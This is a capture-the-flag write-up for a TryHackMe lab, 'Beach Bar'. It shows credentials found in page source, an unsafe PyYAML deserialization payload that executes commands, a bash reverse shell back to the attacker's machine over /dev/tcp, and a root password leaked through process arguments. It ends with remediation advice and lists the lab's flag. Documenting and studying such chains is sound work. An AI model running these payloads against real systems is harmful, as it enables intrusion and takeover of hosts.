# Hacker Holidays 2026 — Day 5: Beach Bar

> **Category:** Boot2Root  
> **Platform:** TryHackMe  
> **Target:** `http://10.130.161.146`  
> **AttackBox IP:** `10.130.155.119`  
> **Objectives:**
> - Find the user flag
> - Find the root flag

## Introduction

Welcome to my write-up for **Day 5 of Hacker Holidays 2026: Beach Bar**.

This challenge involved investigating a Beach Bar DJ web application, discovering exposed login credentials in the page source, exploiting unsafe YAML deserialization to achieve remote code execution, and obtaining a shell as the `bartender` user.

The challenge followed this attack path:

```text
Exposed DJ Credentials
        ↓
Authenticated Access
        ↓
Playlist Import Feature
        ↓
Unsafe YAML Deserialization
        ↓
Remote Code Execution
        ↓
Reverse Shell as bartender
        ↓
User Flag
```

---

# 1. Challenge Briefing

The challenge briefing stated:

> Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone. You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something".
>
> The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.

The clues suggested that the Beach Bar Jukebox web application would be the main attack surface.

The mention of:

> “a DJ who never logs out”

suggested that credentials or an authenticated session might be exposed.

The phrase:

> “a song queue that accepts a little more than song titles”

suggested that user input could be processed insecurely.

---

# 2. Initial Enumeration

The target machine was accessible through the following address:

```text
http://10.130.161.146
```

I began by scanning the target using Nmap:

```bash
nmap -Pn -p- --min-rate 1000 -T4 10.130.161.146
```

The scan revealed two open TCP ports:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The available services were:

| Port | Service | Description |
|---|---|---|
| `22` | SSH | Secure Shell |
| `80` | HTTP | Beach Bar web application |

Since the challenge briefing focused on the jukebox, I investigated the web application running on port `80`.

---

# 3. Finding the DJ Login Credentials

Opening the target in a browser displayed a login page for the Beach Bar DJ booth.

> 📸 **Screenshot Placeholder:** Beach Bar DJ booth login page

I initially considered testing common username and password combinations. However, before attempting more complicated attacks, I inspected the HTML source code.

To view the page source:

1. Right-click on the login page.
2. Select **View Page Source**.
3. Search for comments or hidden information.

Inside an HTML comment, I found a staff note indicating that the demo DJ account was still enabled.

The credentials were:

```text
Username: dj
Password: dj
```

> 📸 **Screenshot Placeholder:** HTML source revealing the demo DJ credentials

I used the credentials to log in:

```text
Username: dj
Password: dj
```

After successfully authenticating, I gained access to the Beach Bar Jukebox dashboard.

---

# 4. Exploring the Jukebox Dashboard

The dashboard displayed the current music set and provided options to:

- Export a playlist
- Import a playlist

> 📸 **Screenshot Placeholder:** Beach Bar Jukebox dashboard after logging in

The playlist functionality became the main area of interest.

The **Export** option downloaded a playlist in YAML format.

The **Import** page allowed users to:

- Paste YAML content directly into a text field
- Upload a YAML playlist file

> 📸 **Screenshot Placeholder:** Beach Bar playlist import page

Initially, I considered whether the upload feature could be vulnerable to a conventional file-upload attack.

However, uploading a file did not make the uploaded file directly accessible through the web server. This suggested that the application was processing the contents of the uploaded file rather than storing it for direct access.

I then focused on how the application parsed the YAML content.

---

# 5. Identifying Unsafe YAML Deserialization

After importing a normal playlist, the application displayed the parsed content in a Python-like object representation instead of treating the YAML as plain text.

> 📸 **Screenshot Placeholder:** Imported playlist displayed as a parsed object

This behavior suggested that the server was deserializing the YAML data.

PyYAML supports Python-specific tags that can create Python objects or invoke Python functions. These features become dangerous when an application processes untrusted YAML using an unsafe loader.

A secure application should use:

```python
yaml.safe_load()
```

instead of an unsafe YAML loader.

To test whether the application was vulnerable, I created the following YAML payload:

```yaml
!!python/object/apply:subprocess.check_output
- ["id"]
```

The payload instructed PyYAML to call Python's:

```python
subprocess.check_output()
```

function and execute the `id` command.

I pasted the payload into the playlist import field and submitted it.

The application returned:

```text
uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
```

> 📸 **Screenshot Placeholder:** YAML payload executing the `id` command

This confirmed that arbitrary commands could be executed on the target.

The commands were running as:

```text
bartender
```

---

# 6. Getting a Reverse Shell

After confirming command execution, I set up a Netcat listener on my TryHackMe AttackBox:

```bash
nc -lvnp 4444
```

The listener waited for an incoming connection on port `4444`.

My AttackBox IP address was:

```text
10.130.155.119
```

I then created a malicious YAML payload containing a Bash reverse shell:

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/10.130.155.119/4444 0>&1'"
```

> 📸 **Screenshot Placeholder:** Malicious YAML reverse-shell payload

After submitting the payload through the playlist import feature, the target connected back to my Netcat listener.

The listener received a shell:

```text
connect to [10.130.155.119] from [10.130.161.146]
bash: cannot set terminal process group
bash: no job control in this shell
bartender@beach-bar:$
```

> 📸 **Screenshot Placeholder:** Netcat receiving a reverse shell from the target

I confirmed the current user by running:

```bash
id
```

The output showed:

```text
uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
```

I now had a shell as the `bartender` user.

---

# 7. Finding the User Flag

I began enumerating the available home directories:

```bash
ls /home
```

The output showed:

```text
bartender
ubuntu
```

I inspected the `bartender` user's home directory:

```bash
ls -la /home/bartender
```

The output included:

```text
user.txt
```

I read the file:

```bash
cat /home/bartender/user.txt
```

The user flag was:

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

---

# User Flag

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

---

# Vulnerability Analysis

The vulnerability was caused by unsafe YAML deserialization.

The application accepted user-controlled YAML content and processed it using an unsafe YAML loader.

The following YAML tag was used to invoke a Python function:

```yaml
!!python/object/apply:subprocess.check_output
```

This allowed the application to execute operating-system commands.

The complete attack chain was:

```text
Beach Bar Login Page
        ↓
HTML Source Code
        ↓
Exposed DJ Credentials
        ↓
Login as dj
        ↓
Playlist Import Feature
        ↓
Unsafe YAML Deserialization
        ↓
Arbitrary Command Execution
        ↓
Reverse Shell as bartender
        ↓
Read /home/bartender/user.txt
        ↓
User Flag
```

---

# Remediation

The application should avoid using unsafe YAML loaders on untrusted input.

Instead of:

```python
yaml.load(content, Loader=yaml.Loader)
```

the application should use:

```python
yaml.safe_load(content)
```

Additional security measures include:

- Validate the structure of uploaded YAML files.
- Treat all uploaded content as untrusted.
- Avoid allowing Python-specific YAML object tags.
- Run web applications with the minimum permissions required.
- Remove default or demo credentials before deployment.
- Avoid storing credentials in client-accessible HTML comments.
- Monitor application logs for suspicious YAML tags such as:

```text
!!python/object
!!python/object/apply
!!python/name
```

---

# Key Takeaways

- Always inspect the page source during web application enumeration.
- HTML comments may expose credentials, developer notes, or sensitive information.
- Default and demo credentials should be removed before deployment.
- YAML can be dangerous when processed using unsafe loaders.
- Unsafe deserialization can lead to arbitrary command execution.
- `yaml.safe_load()` should be used when parsing untrusted YAML.
- Command execution should be verified using:

```bash
id
```

- A reverse shell can provide more convenient access for local enumeration.
- User home directories are common locations for user flags.

---

# Progress

- [x] Found the DJ credentials
- [x] Logged in to the Beach Bar Jukebox
- [x] Identified unsafe YAML deserialization
- [x] Achieved command execution as `bartender`
- [x] Obtained a reverse shell
- [x] Found the user flag
- [ ] Found the root flag

---

## User Flag

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```
<img width="959" height="436" alt="image" src="https://github.com/user-attachments/assets/4ddd4663-401c-4043-b5fe-9b6c9b8481b6" />

---


# Privilege Escalation

The privilege-escalation path took me considerably longer to find, though it was stupidly simple in hindsight. I eventually transferred and ran linPEAS, which drew my attention to the target’s running processes.

A Python service named `jukeboxd.py` was running as root. More importantly, its command line included the root password in plaintext. The same information can be inspected manually with a command such as:

```bash
ps aux
```

> 📸 **Screenshot Placeholder:** Root-owned `jukeboxd` process exposing its stream password in a command-line argument

Process arguments are normally visible to other local users on Linux. Passing a secret as a command-line argument therefore exposes it through tools such as `ps` and often through `/proc/<PID>/cmdline` as well.

With the leaked password, I switched to the root account:

```bash
su root
```

I then confirmed that I had root access:

```bash
whoami
```

The output returned:

```text
root
```

Finally, I retrieved the root flag:

```bash
cat /root/root.txt
```

> 📸 <img width="1918" height="877" alt="image" src="https://github.com/user-attachments/assets/a7d56340-e655-42c2-8bbb-20e5e78ff37d" /> Using the leaked password to become root and retrieve the masked root flag

The second flag was located in:

```text
/root/root.txt
```

---



# Why the Exploit Chain Worked

The room combined three separate security mistakes:

```text
Credentials left in HTML source
              ↓
Authenticated playlist importer
              ↓
Unsafe YAML deserialization
              ↓
Command execution as bartender
              ↓
Root password visible in a process command
              ↓
Root access
```

The first issue exposed an account, but the account alone did not provide shell access. The second issue turned access to the playlist importer into arbitrary command execution. The final issue converted a low-privileged shell into full control of the host.

---

# Takeaways

Beach Bar reinforced a practical enumeration and hardening checklist:

- Inspect page source, comments, scripts, and network requests before attempting more complicated attacks.
- Never leave demo credentials in production code, even inside comments.
- Treat deserialization of user-controlled data as a high-risk operation.
- Use `yaml.safe_load()` or `SafeLoader` when PyYAML only needs to parse standard data types.
- Do not pass passwords, API keys, or other secrets as process arguments.
- Inspect running processes during Linux privilege-escalation enumeration.
- Rotate any credential that has been exposed, rather than merely hiding it later.

## Disclaimer

This write-up was created for educational purposes using an authorized TryHackMe laboratory environment.
